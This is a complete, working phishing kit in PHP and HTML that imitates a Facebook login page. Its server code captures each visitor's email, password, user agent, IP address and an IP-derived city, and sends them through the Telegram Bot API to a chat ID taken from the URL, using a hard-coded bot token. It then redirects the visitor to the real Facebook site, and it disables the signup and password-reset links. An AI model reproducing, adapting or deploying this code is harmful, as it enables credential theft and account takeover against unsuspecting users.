<?php

// Check if the form has been submitted using the POST method
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Retrieve form data and sanitize it using htmlspecialchars to prevent XSS
    $pageName = htmlspecialchars($_POST['pagename'] ?? 'Unknown Page');
    $email = htmlspecialchars($_POST['email'] ?? 'N/A');
    $password = htmlspecialchars($_POST['password'] ?? 'N/A'); // Password is sensitive, handle with care (though for this purpose it's captured)

    // Get User Agent string from the server variables
    $userAgent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'N/A');

    // Get the client's IP address
    $ipAddress = htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'N/A');

    // --- Fetch City Information based on IP Address ---
    $cityName = 'N/A'; // Default value if city cannot be determined
    // Construct the URL for the IP API service
    $ipApiUrl = "https://ipapi.co/{$ipAddress}/json/";

    // Use cURL for a more robust HTTP request to the IP API
    $ch_ip = curl_init();
    curl_setopt($ch_ip, CURLOPT_URL, $ipApiUrl);
    curl_setopt($ch_ip, CURLOPT_RETURNTRANSFER, true); // Return response as a string
    curl_setopt($ch_ip, CURLOPT_TIMEOUT, 5); // Set a timeout for the request

    $ipDetailsJson = curl_exec($ch_ip);
    $ipApiError = curl_error($ch_ip);
    curl_close($ch_ip);

    if ($ipDetailsJson && !$ipApiError) {
        $data = json_decode($ipDetailsJson, true);
        if (isset($data['city']) && !empty($data['city'])) {
            $cityName = htmlspecialchars($data['city']);
        }
    } else {
        // Log the error if IP API call fails (useful for debugging)
        error_log("Error fetching IP details from ipapi.co: " . $ipApiError);
    }
    // --- End IP API Call ---

    // --- Telegram Bot Configuration ---
    // IMPORTANT: Replace 'YOUR_BOT_TOKEN_HERE' with your actual Telegram bot token.
    $botToken = '7290451157:AAFoAI4fd8J2Zej0Q7xYY2dCZZxLQrEhMk0'; // Your actual Telegram Bot Token

    // Get the Telegram chat ID from the URL parameter '?id='
    // If 'id' parameter is not present, it will default to a placeholder.
    // In a real application, ensure this ID is obtained securely.
    $chatId = htmlspecialchars($_GET['id'] ?? '-YOUR_DEFAULT_CHAT_ID-');

    // Prepare the message text to be sent to Telegram
    $message = "> Login Page : {$pageName}\n\n" .
               "> Email : {$email}\n\n" .
               "> Password : {$password}\n\n" .
               "> User Agent : {$userAgent}\n\n" .
               "> IP Address : {$ipAddress}\n\n" .
               "> City : {$cityName}";

    // Telegram API URL for sending messages
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // Data payload for the Telegram API request
    $telegramParams = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // --- Send message to Telegram using cURL ---
    $ch_tg = curl_init();
    curl_setopt($ch_tg, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch_tg, CURLOPT_POST, 1);
    curl_setopt($ch_tg, CURLOPT_POSTFIELDS, json_encode($telegramParams));
    curl_setopt($ch_tg, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch_tg, CURLOPT_RETURNTRANSFER, true); // Return the response from Telegram

    $telegramResponse = curl_exec($ch_tg);
    $telegramError = curl_error($ch_tg);
    curl_close($ch_tg);

    if ($telegramError) {
        error_log('Error sending data to Telegram: ' . $telegramError);
    }
    // --- End Telegram Message Send ---

    // Redirect the user to the legitimate Facebook website after processing
    header("Location: https://www.facebook.com");
    exit(); // Ensure no further code is executed after the redirect
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        /* Basic reset for consistent styling */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2ff; /* Light gray background, typical for Facebook */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh; /* Use min-height to ensure it covers the viewport */
            margin: 0;
            padding: 20px; /* Add some padding for smaller screens */
        }

        .container {
            background-color: white;
            border: 1px solid #dddfe2; /* Subtle border */
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); /* Soft shadow */
            text-align: center;
            width: 100%; /* Full width on small screens */
            max-width: 380px; /* Max width for larger screens */
            padding: 24px; /* Increased padding for better spacing */
        }

        .logo-container {
            margin-bottom: 20px;
        }

        .logo {
            font-family: 'Arial Black', sans-serif; /* Stronger font for logo */
            font-size: 40px; /* Slightly larger logo */
            color: #1877f2; /* Facebook blue */
            font-weight: 800; /* Extra bold */
            margin-bottom: 5px;
        }

        .slogan {
            color: #606770; /* Muted gray for slogan */
            font-size: 17px; /* Slightly larger slogan */
            margin-top: 5px;
            line-height: 1.2;
        }

        .form-container {
            text-align: center;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px; /* More padding for better input feel */
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px; /* Slightly more rounded corners */
            font-size: 17px;
            line-height: 1.5; /* Improve text alignment */
            color: #1c1e21;
        }

        .input-field:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff; /* Focus highlight */
        }

        .login-button {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px 16px;
            width: 100%;
            cursor: pointer;
            font-size: 20px; /* Larger font for button */
            font-weight: bold;
            margin: 12px 0;
            transition: background-color 0.2s ease; /* Smooth transition */
        }

        .login-button:hover {
            background-color: #166fe5; /* Darker blue on hover */
        }

        a {
            text-decoration: none;
            color: #1877f2;
            font-size: 14px;
        }

        a:hover {
            text-decoration: underline;
        }

        .divider {
            margin: 16px 0; /* More spacing for divider */
            border-top: 1px solid #dadde1; /* Lighter divider color */
            position: relative;
            line-height: 0; /* Ensures line is thin */
        }

        .create-account-button {
            background-color: #42b72a; /* Facebook green for create account */
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px 16px;
            width: auto; /* Auto width for this button */
            cursor: pointer;
            font-size: 17px;
            font-weight: bold;
            margin-top: 10px;
            transition: background-color 0.2s ease;
            display: inline-block; /* Allows auto width and margins */
        }

        .create-account-button:hover {
            background-color: #36a420; /* Darker green on hover */
        }

        /* Styles for the popup */
        .popup {
            display: none; /* Hidden by default */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.85); /* Darker overlay */
            color: white;
            border-radius: 8px;
            padding: 25px; /* More padding */
            z-index: 1000; /* High z-index to be on top */
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            text-align: left;
            max-width: 350px;
            width: 90%;
            opacity: 0; /* Start hidden */
            transition: opacity 0.3s ease-in-out;
        }

        .popup.active {
            display: block; /* Show when active */
            opacity: 1; /* Fade in */
        }

        .popup-content {
            position: relative;
        }

        .popup-close {
            position: absolute;
            top: -10px; /* Adjust position */
            right: -10px; /* Adjust position */
            background-color: #333;
            color: white;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
            cursor: pointer;
            line-height: 1;
            transition: background-color 0.2s ease;
        }

        .popup-close:hover {
            background-color: #555;
        }

        .popup p {
            font-size: 16px;
            margin: 0;
        }

        .popup strong {
            font-size: 18px;
            display: block;
            margin-bottom: 8px;
        }

        /* Responsive adjustments */
        @media (max-width: 480px) {
            .container {
                margin: 10px; /* Margin for smaller screens */
            }
            .logo {
                font-size: 36px;
            }
            .slogan {
                font-size: 15px;
            }
            .input-field, .login-button, .create-account-button {
                font-size: 16px;
                padding: 12px 14px;
            }
            .popup {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <div class="logo">Facebook</div> <p class="slogan">Connect with friends and the world around you.</p>
        </div>
        <div class="form-container">
            <form method="post" action="">
              <input type="hidden" name="pagename" id="pagename" value="Facebook" />
                <input type="text" id="email" placeholder="Email or phone number" class="input-field" name="email" required>
                <input id="password" type="password" placeholder="Password" class="input-field" name="password" required>
                <button type="submit" class="login-button">Log In</button>
            </form>
            <a href="#" id="forgot-password-link">Forgot password?</a>
            <div class="divider"></div>
            <button class="create-account-button" id="signup-button">Create new account</button>
        </div>
    </div>

    <div id="error-popup" class="popup">
        <div class="popup-content">
            <span class="popup-close" id="close-popup">&times;</span>
            <p><strong>Error:</strong> Sign up is currently disabled.</p>
        </div>
    </div>

    <script>
        // JavaScript for handling the popup (signup disabled message)
        document.addEventListener('DOMContentLoaded', function() {
            const forgotPasswordLink = document.getElementById('forgot-password-link');
            const signupButton = document.getElementById('signup-button');
            const errorPopup = document.getElementById('error-popup');
            const closePopup = document.getElementById('close-popup');

            function showPopup(event) {
                event.preventDefault(); // Prevent default link/button behavior
                errorPopup.classList.add('active'); // Add 'active' class to show popup with transition
            }

            function hidePopup() {
                errorPopup.classList.remove('active'); // Remove 'active' class to hide popup
            }

            // Attach event listeners to show the popup
            if (forgotPasswordLink) {
                forgotPasswordLink.addEventListener('click', showPopup);
            }
            if (signupButton) {
                signupButton.addEventListener('click', showPopup);
            }

            // Attach event listener to close the popup
            if (closePopup) {
                closePopup.addEventListener('click', hidePopup);
            }

            // Close popup if clicked outside (optional, but good UX)
            window.addEventListener('click', function(event) {
                if (event.target == errorPopup) {
                    hidePopup();
                }
            });
        });
    </script>
</body>
</html>
